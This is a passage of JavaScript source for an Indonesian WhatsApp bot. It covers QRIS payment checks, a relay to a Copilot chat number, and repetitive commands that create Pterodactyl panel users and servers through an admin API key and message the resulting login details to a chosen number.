                const result = await response.json();

                if (result && result.amount && parseInt(result.amount) === totalAmount) {
                    isTransactionComplete = true;

                    // Simpan data pengguna ke file JSON
                    const fs = require('fs');
                    const usersFilePath = 'src/users.json';
                    let usersData = JSON.parse(fs.readFileSync(usersFilePath, 'utf8'));

                    const userNumber = `${m.sender}`;
                    let user = usersData.find(user => user.nomer === userNumber);

                    if (user) {
                        user.balance = (parseInt(user.balance) || 0) + amount;
                    } else {
                        user = { nomer: userNumber, balance: amount };
                        usersData.push(user);
                        await Aanz.sendMessage(m.chat, { text: 'Akun Anda telah terdaftar otomatis karena tidak ditemukan di sistem. Selamat menggunakan layanan kami!' }, { quoted: m });
                    }

                    fs.writeFileSync(usersFilePath, JSON.stringify(usersData, null, 2));
                    const notification = `*PEMBAYARAN ANDA SELESAI!*\n\n*ID TRANSAKSI:* ${pay.result.transactionId}\n*JUMLAH DITAMBAHKAN:* Rp. ${amount}\n*PEMBAYARAN BERHASIL DITERIMA.*`;
                    await Aanz.sendMessage(m.chat, { text: notification }, { quoted: m });
                }
            } catch (error) {
                console.error('Error memeriksa status transaksi:', error);
            }

            if (!isTransactionComplete) {
                await new Promise(resolve => setTimeout(resolve, 10000)); // Tunggu 10 detik sebelum cek ulang
            }
        }

        if (!isTransactionComplete) {
            const expiredText = `*WAKTU PEMBAYARAN TELAH HABIS!*\n\nTransaksi Anda telah melebihi batas waktu untuk melakukan pembayaran. Silakan coba lagi dengan membuat transaksi baru.`;
            await Aanz.sendMessage(m.chat, { text: expiredText }, { quoted: m });
        }

    } catch (error) {
        console.error('Error membuat QRIS atau memeriksa status:', error);
        m.reply('Gagal membuat atau memeriksa pembayaran.');
    }
}
break;

case 'chatbot': {
const microsoftCopilotNumber = '18772241042@s.whatsapp.net';
if (!text) {
return m.reply("Silakan masukkan pesan yang ingin dikirim.");
}
await Aanz.sendMessage(microsoftCopilotNumber, {
text: text
});
if (global.responseListener) {
Aanz.ev.off('messages.upsert', global.responseListener);
}
global.responseListener = async (msg) => {
if (
msg.messages[0].key.remoteJid === microsoftCopilotNumber && 
msg.messages[0].message?.conversation
) {
const response = msg.messages[0].message.conversation;
await Aanz.sendMessage(m.chat, {
text: `${response}`
});
}
};
Aanz.ev.on('messages.upsert', global.responseListener);
}
break

case 'cpanel':
{
 if (!isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');

 const videoUrl = 'https://files.catbox.moe/iyqnvx.mp4';

 let teks = `
┌───「 *List Panel V1* 」───
│ 1gb *(Nama-User)*
│ 2gb *(Nama-User)*
│ 3gb *(Nama-User)*
│ 4gb *(Nama-User)*
│ 5gb *(Nama-User)*
│ unli *(Nama-User)*
└───────────────────
┌───「 *List Panel V2* 」───
│ 1gb-2 *(Nama-User)*
│ 2gb-2 *(Nama-User)*
│ 3gb-2 *(Nama-User)*
│ 4gb-2 *(Nama-User)*
│ 5gb-2 *(Nama-User)*
│ unli-2 *(Nama-User)*
└───────────────────
┌───「 *List Panel V3* 」───
│ 1gb-3 *(Nama-User)*
│ 2gb-3 *(Nama-User)*
│ 3gb-3 *(Nama-User)*
│ 4gb-3 *(Nama-User)*
│ 5gb-3 *(Nama-User)*
│ unli-3 *(Nama-User)*
└───────────────────
> *_© Developer AanzCuyxzzz_*
`;

 await Aanz.sendMessage(m.chat, {
 video: { url: videoUrl },
 caption: teks,
 gifPlayback: true,
 gifAttribution: 1,
 contextInfo: {
 mentionedJid: [m.sender],
 externalAdReply: {
 showAdAttribution: true,
 title: 'AanzCuyxzzz - V2',
 body: 'Bot WhatsApp multi-fungsi menggunakan @Whiskeysockets/baileys.',
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 }, { quoted: m });
}
break;

case '1gb':
{
 if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 let t = text.split('-');
 if (t.length < 2) return m.reply(`Contoh: ${prefix + command} username-nomer`);

 let username = t[0].trim();
 let u =
 t[1] // Jika ada teks setelah '-'
 ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
 : m.mentionedJid && m.mentionedJid[0]
 ? m.mentionedJid[0]
 : m.quoted
 ? m.quoted.sender
 : null;

 if (!u) return m.reply("Nomor target tidak valid. Silakan mention atau tulis nomor setelah tanda '-'.");

 let name = username;
 let email = username + "@gmail.com";
 let ownername = global.namaowner || "Pemilik Bot";
 let egg = "15"; // Egg ID
 let loc = "1"; // Lokasi server
 let memo = "1024"; // Memori unlimited
 let cpu = "500"; // CPU unlimited
 let disk = "0"; // Disk unlimited
 let password = crypto.randomBytes(5).toString('hex');

 try {
 // Buat pengguna
 let f = await fetch(domain + "/api/application/users", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + apikey,
 },
 body: JSON.stringify({
 email: email,
 username: username,
 first_name: username,
 last_name: username,
 language: "en",
 password: password.toString(),
 }),
 });
 let data = await f.json();
 if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

 let user = data.attributes;

 // Ambil detail Egg
 let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
 method: "GET",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + apikey,
 },
 });
 let eggData = await f2.json();
 let startupCmd = eggData.attributes.startup;

 // Buat server
 let f3 = await fetch(domain + "/api/application/servers", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + apikey,
 },
 body: JSON.stringify({
 name: name,
 description: "Server Unlimited",
 user: user.id,
 egg: parseInt(egg),
 docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
 startup: startupCmd,
 environment: {
 INST: "npm",
 USER_UPLOAD: "0",
 AUTO_UPDATE: "0",
 CMD_RUN: "npm start",
 },
 limits: {
 memory: memo,
 swap: 0,
 disk: disk,
 io: 500,
 cpu: cpu,
 },
 feature_limits: {
 databases: 0,
 backups: 0,
 allocations: 1,
 },
 deploy: {
 locations: [parseInt(loc)],
 dedicated_ip: false,
 port_range: [],
 },
 }),
 });
 let serverRes = await f3.json();
 if (serverRes.errors) return m.reply(JSON.stringify(serverRes.errors[0], null, 2));

 let server = serverRes.attributes;

 // URL video thumbnail
 const videoUrl = 'https://files.catbox.moe/iyqnvx.mp4'; // Ganti dengan URL video

 // Kirim pesan ke target
 let ctf = `┌───「 *AanzCuyxzzz-V2* 」───
│ *Username* : ${user.username}
│ *Password* : ${password}
│ *Link Panel* : ${domain}
└───────────────────
> *_© Developer : AanzCuyxzzz_*`;

 await Aanz.sendMessage(u, {
 video: { url: videoUrl },
 caption: ctf,
 gifPlayback: true,
 contextInfo: {
 externalAdReply: {
 title: 'Unlimited Server Created',
 body: 'Bot WhatsApp Multi-Fungsi',
 thumbnailUrl: 'https://example.com/thumbnail.jpg', // Ganti URL thumbnail jika ada
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 });

 m.reply(`✅ Paket berhasil dikirim ke ${username}`);
 } catch (err) {
 console.error(err);
 m.reply("❌ Terjadi kesalahan saat membuat user atau server.");
 }
}
break;

case '2gb':
{
 if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 let t = text.split('-');
 if (t.length < 2) return m.reply(`Contoh: ${prefix + command} username-nomer`);

 let username = t[0].trim();
 let u =
 t[1] // Jika ada teks setelah '-'
 ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
 : m.mentionedJid && m.mentionedJid[0]
 ? m.mentionedJid[0]
 : m.quoted
 ? m.quoted.sender
 : null;

 if (!u) return m.reply("Nomor target tidak valid. Silakan mention atau tulis nomor setelah tanda '-'.");

 let name = username;
 let email = username + "@gmail.com";
 let ownername = global.namaowner || "Pemilik Bot";
 let egg = "15"; // Egg ID
 let loc = "1"; // Lokasi server
 let memo = "2024"; // Memori unlimited
 let cpu = "1000"; // CPU unlimited
 let disk = "0"; // Disk unlimited
 let password = crypto.randomBytes(5).toString('hex');

 try {
 // Buat pengguna
 let f = await fetch(domain + "/api/application/users", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + apikey,
 },
 body: JSON.stringify({
 email: email,
 username: username,
 first_name: username,
 last_name: username,
 language: "en",
 password: password.toString(),
 }),
 });
 let data = await f.json();
 if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

 let user = data.attributes;

 // Ambil detail Egg
 let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
 method: "GET",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + apikey,
 },
 });
 let eggData = await f2.json();
 let startupCmd = eggData.attributes.startup;

 // Buat server
 let f3 = await fetch(domain + "/api/application/servers", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + apikey,
 },
 body: JSON.stringify({
 name: name,
 description: "Server Unlimited",
 user: user.id,
 egg: parseInt(egg),
 docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
 startup: startupCmd,
 environment: {
 INST: "npm",
 USER_UPLOAD: "0",
 AUTO_UPDATE: "0",
 CMD_RUN: "npm start",
 },
 limits: {
 memory: memo,
 swap: 0,
 disk: disk,
 io: 500,
 cpu: cpu,
 },
 feature_limits: {
 databases: 0,
 backups: 0,
 allocations: 1,
 },
 deploy: {
 locations: [parseInt(loc)],
 dedicated_ip: false,
 port_range: [],
 },
 }),
 });
 let serverRes = await f3.json();
 if (serverRes.errors) return m.reply(JSON.stringify(serverRes.errors[0], null, 2));

 let server = serverRes.attributes;

 // URL video thumbnail
 const videoUrl = 'https://files.catbox.moe/iyqnvx.mp4'; // Ganti dengan URL video

 // Kirim pesan ke target
 let ctf = `┌───「 *AanzCuyxzzz-V2* 」───
│ *Username* : ${user.username}
│ *Password* : ${password}
│ *Link Panel* : ${domain}
└───────────────────
> *_© Developer : AanzCuyxzzz_*`;

 await Aanz.sendMessage(u, {
 video: { url: videoUrl },
 caption: ctf,
 gifPlayback: true,
 contextInfo: {
 externalAdReply: {
 title: 'Unlimited Server Created',
 body: 'Bot WhatsApp Multi-Fungsi',
 thumbnailUrl: 'https://example.com/thumbnail.jpg', // Ganti URL thumbnail jika ada
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 });

 m.reply(`✅ Paket berhasil dikirim ke ${username}`);
 } catch (err) {
 console.error(err);
 m.reply("❌ Terjadi kesalahan saat membuat user atau server.");
 }
}
break;

case '3gb':
{
 if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 let t = text.split('-');
 if (t.length < 2) return m.reply(`Contoh: ${prefix + command} username-nomer`);

 let username = t[0].trim();
 let u =
 t[1] // Jika ada teks setelah '-'
 ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
 : m.mentionedJid && m.mentionedJid[0]
 ? m.mentionedJid[0]
 : m.quoted
 ? m.quoted.sender
 : null;

 if (!u) return m.reply("Nomor target tidak valid. Silakan mention atau tulis nomor setelah tanda '-'.");

 let name = username;
 let email = username + "@gmail.com";
 let ownername = global.namaowner || "Pemilik Bot";
 let egg = "15"; // Egg ID
 let loc = "1"; // Lokasi server
 let memo = "3024"; // Memori unlimited
 let cpu = "2000"; // CPU unlimited
 let disk = "0"; // Disk unlimited
 let password = crypto.randomBytes(5).toString('hex');

 try {
 // Buat pengguna
 let f = await fetch(domain + "/api/application/users", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + apikey,
 },
 body: JSON.stringify({
 email: email,
 username: username,
 first_name: username,
 last_name: username,
 language: "en",
 password: password.toString(),
 }),
 });
 let data = await f.json();
 if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

 let user = data.attributes;

 // Ambil detail Egg
 let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
 method: "GET",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + apikey,
 },
 });
 let eggData = await f2.json();
 let startupCmd = eggData.attributes.startup;

 // Buat server
 let f3 = await fetch(domain + "/api/application/servers", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + apikey,
 },
 body: JSON.stringify({
 name: name,
 description: "Server Unlimited",
 user: user.id,
 egg: parseInt(egg),
 docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
 startup: startupCmd,
 environment: {
 INST: "npm",
 USER_UPLOAD: "0",
 AUTO_UPDATE: "0",
 CMD_RUN: "npm start",
 },
 limits: {
 memory: memo,
 swap: 0,
 disk: disk,
 io: 500,
 cpu: cpu,
 },
 feature_limits: {
 databases: 0,
 backups: 0,
 allocations: 1,
 },
 deploy: {
 locations: [parseInt(loc)],
 dedicated_ip: false,
 port_range: [],
 },
 }),
 });
 let serverRes = await f3.json();
 if (serverRes.errors) return m.reply(JSON.stringify(serverRes.errors[0], null, 2));

 let server = serverRes.attributes;

 // URL video thumbnail
 const videoUrl = 'https://files.catbox.moe/iyqnvx.mp4'; // Ganti dengan URL video

 // Kirim pesan ke target
 let ctf = `┌───「 *AanzCuyxzzz-V2* 」───
│ *Username* : ${user.username}
│ *Password* : ${password}
│ *Link Panel* : ${domain}
└───────────────────
> *_© Developer : AanzCuyxzzz_*`;

 await Aanz.sendMessage(u, {
 video: { url: videoUrl },
 caption: ctf,
 gifPlayback: true,
 contextInfo: {
 externalAdReply: {
 title: 'Unlimited Server Created',
 body: 'Bot WhatsApp Multi-Fungsi',
 thumbnailUrl: 'https://example.com/thumbnail.jpg', // Ganti URL thumbnail jika ada
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 });

 m.reply(`✅ Paket berhasil dikirim ke ${username}`);
 } catch (err) {
 console.error(err);
 m.reply("❌ Terjadi kesalahan saat membuat user atau server.");
 }
}
break;

case '4gb':
{
 if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 let t = text.split('-');
 if (t.length < 2) return m.reply(`Contoh: ${prefix + command} username-nomer`);

 let username = t[0].trim();
 let u =
 t[1] // Jika ada teks setelah '-'
 ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
 : m.mentionedJid && m.mentionedJid[0]
 ? m.mentionedJid[0]
 : m.quoted
 ? m.quoted.sender
 : null;

 if (!u) return m.reply("Nomor target tidak valid. Silakan mention atau tulis nomor setelah tanda '-'.");

 let name = username;
 let email = username + "@gmail.com";
 let ownername = global.namaowner || "Pemilik Bot";
 let egg = "15"; // Egg ID
 let loc = "1"; // Lokasi server
 let memo = "4024"; // Memori unlimited
 let cpu = "3000"; // CPU unlimited
 let disk = "0"; // Disk unlimited
 let password = crypto.randomBytes(5).toString('hex');

 try {
 // Buat pengguna
 let f = await fetch(domain + "/api/application/users", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + apikey,
 },
 body: JSON.stringify({
 email: email,
 username: username,
 first_name: username,
 last_name: username,
 language: "en",
 password: password.toString(),
 }),
 });
 let data = await f.json();
 if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

 let user = data.attributes;

 // Ambil detail Egg
 let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
 method: "GET",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + apikey,
 },
 });
 let eggData = await f2.json();
 let startupCmd = eggData.attributes.startup;

 // Buat server
 let f3 = await fetch(domain + "/api/application/servers", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + apikey,
 },
 body: JSON.stringify({
 name: name,
 description: "Server Unlimited",
 user: user.id,
 egg: parseInt(egg),
 docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
 startup: startupCmd,
 environment: {
 INST: "npm",
 USER_UPLOAD: "0",
 AUTO_UPDATE: "0",
 CMD_RUN: "npm start",
 },
 limits: {
 memory: memo,
 swap: 0,
 disk: disk,
 io: 500,
 cpu: cpu,
 },
 feature_limits: {
 databases: 0,
 backups: 0,
 allocations: 1,
 },
 deploy: {
 locations: [parseInt(loc)],
 dedicated_ip: false,
 port_range: [],
 },
 }),
 });
 let serverRes = await f3.json();
 if (serverRes.errors) return m.reply(JSON.stringify(serverRes.errors[0], null, 2));

 let server = serverRes.attributes;

 // URL video thumbnail
 const videoUrl = 'https://files.catbox.moe/iyqnvx.mp4'; // Ganti dengan URL video

 // Kirim pesan ke target
 let ctf = `┌───「 *AanzCuyxzzz-V2* 」───
│ *Username* : ${user.username}
│ *Password* : ${password}
│ *Link Panel* : ${domain}
└───────────────────
> *_© Developer : AanzCuyxzzz_*`;

 await Aanz.sendMessage(u, {
 video: { url: videoUrl },
 caption: ctf,
 gifPlayback: true,
 contextInfo: {
 externalAdReply: {
 title: 'Unlimited Server Created',
 body: 'Bot WhatsApp Multi-Fungsi',
 thumbnailUrl: 'https://example.com/thumbnail.jpg', // Ganti URL thumbnail jika ada
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 });

 m.reply(`✅ Paket berhasil dikirim ke ${username}`);
 } catch (err) {
 console.error(err);
 m.reply("❌ Terjadi kesalahan saat membuat user atau server.");
 }
}
break;

case '5gb':
{
 if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 let t = text.split('-');
 if (t.length < 2) return m.reply(`Contoh: ${prefix + command} username-nomer`);

 let username = t[0].trim();
 let u =
 t[1] // Jika ada teks setelah '-'
 ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
 : m.mentionedJid && m.mentionedJid[0]
 ? m.mentionedJid[0]
 : m.quoted
 ? m.quoted.sender
 : null;

 if (!u) return m.reply("Nomor target tidak valid. Silakan mention atau tulis nomor setelah tanda '-'.");

 let name = username;
 let email = username + "@gmail.com";
 let ownername = global.namaowner || "Pemilik Bot";
 let egg = "15"; // Egg ID
 let loc = "1"; // Lokasi server
 let memo = "5024"; // Memori unlimited
 let cpu = "4000"; // CPU unlimited
 let disk = "0"; // Disk unlimited
 let password = crypto.randomBytes(5).toString('hex');

 try {
 // Buat pengguna
 let f = await fetch(domain + "/api/application/users", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + apikey,
 },
 body: JSON.stringify({
 email: email,
 username: username,
 first_name: username,
 last_name: username,
 language: "en",
 password: password.toString(),
 }),
 });
 let data = await f.json();
 if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

 let user = data.attributes;

 // Ambil detail Egg
 let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
 method: "GET",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + apikey,
 },
 });
 let eggData = await f2.json();
 let startupCmd = eggData.attributes.startup;

 // Buat server
 let f3 = await fetch(domain + "/api/application/servers", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + apikey,
 },
 body: JSON.stringify({
 name: name,
 description: "Server Unlimited",
 user: user.id,
 egg: parseInt(egg),
 docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
 startup: startupCmd,
 environment: {
 INST: "npm",
 USER_UPLOAD: "0",
 AUTO_UPDATE: "0",
 CMD_RUN: "npm start",
 },
 limits: {
 memory: memo,
 swap: 0,
 disk: disk,
 io: 500,
 cpu: cpu,
 },
 feature_limits: {
 databases: 0,
 backups: 0,
 allocations: 1,
 },
 deploy: {
 locations: [parseInt(loc)],
 dedicated_ip: false,
 port_range: [],
 },
 }),
 });
 let serverRes = await f3.json();
 if (serverRes.errors) return m.reply(JSON.stringify(serverRes.errors[0], null, 2));

 let server = serverRes.attributes;

 // URL video thumbnail
 const videoUrl = 'https://files.catbox.moe/iyqnvx.mp4'; // Ganti dengan URL video

 // Kirim pesan ke target
 let ctf = `┌───「 *AanzCuyxzzz-V2* 」───
│ *Username* : ${user.username}
│ *Password* : ${password}
│ *Link Panel* : ${domain}
└───────────────────
> *_© Developer : AanzCuyxzzz_*`;

 await Aanz.sendMessage(u, {
 video: { url: videoUrl },
 caption: ctf,
 gifPlayback: true,
 contextInfo: {
 externalAdReply: {
 title: 'Unlimited Server Created',
 body: 'Bot WhatsApp Multi-Fungsi',
 thumbnailUrl: 'https://example.com/thumbnail.jpg', // Ganti URL thumbnail jika ada
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 });

 m.reply(`✅ Paket berhasil dikirim ke ${username}`);
 } catch (err) {
 console.error(err);
 m.reply("❌ Terjadi kesalahan saat membuat user atau server.");
 }
}
break;

case '1gb-2': {
 if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 
 let t = text.split('-');
 if (t.length < 2) return m.reply(`Contoh: ${prefix + command} username-nomer`);

 let username = t[0].trim();
 let u =
 t[1] // Jika ada teks setelah '-'
 ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
 : m.mentionedJid && m.mentionedJid[0]
 ? m.mentionedJid[0]
 : m.quoted
 ? m.quoted.sender
 : null;

 if (!u) return m.reply("Nomor target tidak valid. Silakan mention atau tulis nomor setelah tanda '-'.");

 let name = username;
 let email = username + "@gmail.com";
 let ownername = global.namaowner || "Pemilik Bot";
 let egg = "15"; // Egg ID
 let loc = "1"; // Lokasi server untuk unli2
 let memo = "1024"; // Memori unlimited
 let cpu = "0"; // CPU unlimited
 let disk = "0"; // Disk unlimited
 let password = crypto.randomBytes(5).toString('hex');

 try {
 // Buat pengguna
 let f = await fetch(global.domain2 + "/api/application/users", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey2,
 },
 body: JSON.stringify({
 email: email,
 username: username,
 first_name: username,
 last_name: username,
 language: "en",
 password: password.toString(),
 }),
 });

 let data = await f.json();
 if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

 let user = data.attributes;

 // Ambil detail Egg
 let f2 = await fetch(global.domain2 + "/api/application/nests/5/eggs/" + egg, {
 method: "GET",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey2,
 },
 });

 let eggData = await f2.json();
 let startupCmd = eggData.attributes.startup;

 // Buat server
 let f3 = await fetch(global.domain2 + "/api/application/servers", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey2,
 },
 body: JSON.stringify({
 name: name,
 description: "Server Unlimited",
 user: user.id,
 egg: parseInt(egg),
 docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
 startup: startupCmd,
 environment: {
 INST: "npm",
 USER_UPLOAD: "0",
 AUTO_UPDATE: "0",
 CMD_RUN: "npm start",
 },
 limits: {
 memory: memo,
 swap: 0,
 disk: disk,
 io: 500,
 cpu: cpu,
 },
 feature_limits: {
 databases: 0,
 backups: 0,
 allocations: 1,
 },
 deploy: {
 locations: [parseInt(loc)], // Lokasi server untuk unli2
 dedicated_ip: false,
 port_range: [],
 },
 }),
 });

 let serverRes = await f3.json();
 if (serverRes.errors) return m.reply(JSON.stringify(serverRes.errors[0], null, 2));

 let server = serverRes.attributes;

 // Kirim pesan konfirmasi server ke target
 let ctf = `┌───「 *AanzCuyxzzz-V2* 」───
│ *Username* : ${user.username}
│ *Password* : ${password}
│ *Link Panel* : ${global.domain2}
└───────────────────
> *_© Developer : AanzCuyxzzz_*`;

 await Aanz.sendMessage(u, {
 video: { url: "https://files.catbox.moe/iyqnvx.mp4" }, // URL video untuk konfirmasi
 caption: ctf,
 gifPlayback: true,
 contextInfo: {
 externalAdReply: {
 title: 'Unlimited Server Created',
 body: 'Bot WhatsApp Multi-Fungsi',
 thumbnailUrl: 'https://example.com/thumbnail.jpg', // Thumbnail
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 });

 m.reply(`✅ Paket berhasil dikirim ke ${username}`);
 } catch (err) {
 console.error(err);
 m.reply("❌ Terjadi kesalahan saat membuat user atau server.");
 }
}
break;

case '2gb-2': {
 if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 
 let t = text.split('-');
 if (t.length < 2) return m.reply(`Contoh: ${prefix + command} username-nomer`);

 let username = t[0].trim();
 let u =
 t[1] // Jika ada teks setelah '-'
 ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
 : m.mentionedJid && m.mentionedJid[0]
 ? m.mentionedJid[0]
 : m.quoted
 ? m.quoted.sender
 : null;

 if (!u) return m.reply("Nomor target tidak valid. Silakan mention atau tulis nomor setelah tanda '-'.");

 let name = username;
 let email = username + "@gmail.com";
 let ownername = global.namaowner || "Pemilik Bot";
 let egg = "15"; // Egg ID
 let loc = "1"; // Lokasi server untuk unli2
 let memo = "2024"; // Memori unlimited
 let cpu = "0"; // CPU unlimited
 let disk = "0"; // Disk unlimited
 let password = crypto.randomBytes(5).toString('hex');

 try {
 // Buat pengguna
 let f = await fetch(global.domain2 + "/api/application/users", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey2,
 },
 body: JSON.stringify({
 email: email,
 username: username,
 first_name: username,
 last_name: username,
 language: "en",
 password: password.toString(),
 }),
 });

 let data = await f.json();
 if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

 let user = data.attributes;

 // Ambil detail Egg
 let f2 = await fetch(global.domain2 + "/api/application/nests/5/eggs/" + egg, {
 method: "GET",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey2,
 },
 });

 let eggData = await f2.json();
 let startupCmd = eggData.attributes.startup;

 // Buat server
 let f3 = await fetch(global.domain2 + "/api/application/servers", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey2,
 },
 body: JSON.stringify({
 name: name,
 description: "Server Unlimited",
 user: user.id,
 egg: parseInt(egg),
 docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
 startup: startupCmd,
 environment: {
 INST: "npm",
 USER_UPLOAD: "0",
 AUTO_UPDATE: "0",
 CMD_RUN: "npm start",
 },
 limits: {
 memory: memo,
 swap: 0,
 disk: disk,
 io: 500,
 cpu: cpu,
 },
 feature_limits: {
 databases: 0,
 backups: 0,
 allocations: 1,
 },
 deploy: {
 locations: [parseInt(loc)], // Lokasi server untuk unli2
 dedicated_ip: false,
 port_range: [],
 },
 }),
 });

 let serverRes = await f3.json();
 if (serverRes.errors) return m.reply(JSON.stringify(serverRes.errors[0], null, 2));

 let server = serverRes.attributes;

 // Kirim pesan konfirmasi server ke target
 let ctf = `┌───「 *AanzCuyxzzz-V2* 」───
│ *Username* : ${user.username}
│ *Password* : ${password}
│ *Link Panel* : ${global.domain2}
└───────────────────
> *_© Developer : AanzCuyxzzz_*`;

 await Aanz.sendMessage(u, {
 video: { url: "https://files.catbox.moe/iyqnvx.mp4" }, // URL video untuk konfirmasi
 caption: ctf,
 gifPlayback: true,
 contextInfo: {
 externalAdReply: {
 title: 'Unlimited Server Created',
 body: 'Bot WhatsApp Multi-Fungsi',
 thumbnailUrl: 'https://example.com/thumbnail.jpg', // Thumbnail
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 });

 m.reply(`✅ Paket berhasil dikirim ke ${username}`);
 } catch (err) {
 console.error(err);
 m.reply("❌ Terjadi kesalahan saat membuat user atau server.");
 }
}
break;

case '3gb-2': {
 if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 
 let t = text.split('-');
 if (t.length < 2) return m.reply(`Contoh: ${prefix + command} username-nomer`);

 let username = t[0].trim();
 let u =
 t[1] // Jika ada teks setelah '-'
 ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
 : m.mentionedJid && m.mentionedJid[0]
 ? m.mentionedJid[0]
 : m.quoted
 ? m.quoted.sender
 : null;

 if (!u) return m.reply("Nomor target tidak valid. Silakan mention atau tulis nomor setelah tanda '-'.");

 let name = username;
 let email = username + "@gmail.com";
 let ownername = global.namaowner || "Pemilik Bot";
 let egg = "15"; // Egg ID
 let loc = "1"; // Lokasi server untuk unli2
 let memo = "3024"; // Memori unlimited
 let cpu = "0"; // CPU unlimited
 let disk = "0"; // Disk unlimited
 let password = crypto.randomBytes(5).toString('hex');

 try {
 // Buat pengguna
 let f = await fetch(global.domain2 + "/api/application/users", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey2,
 },
 body: JSON.stringify({
 email: email,
 username: username,
 first_name: username,
 last_name: username,
 language: "en",
 password: password.toString(),
 }),
 });

 let data = await f.json();
 if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

 let user = data.attributes;

 // Ambil detail Egg
 let f2 = await fetch(global.domain2 + "/api/application/nests/5/eggs/" + egg, {
 method: "GET",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey2,
 },
 });

 let eggData = await f2.json();
 let startupCmd = eggData.attributes.startup;

 // Buat server
 let f3 = await fetch(global.domain2 + "/api/application/servers", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey2,
 },
 body: JSON.stringify({
 name: name,
 description: "Server Unlimited",
 user: user.id,
 egg: parseInt(egg),
 docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
 startup: startupCmd,
 environment: {
 INST: "npm",
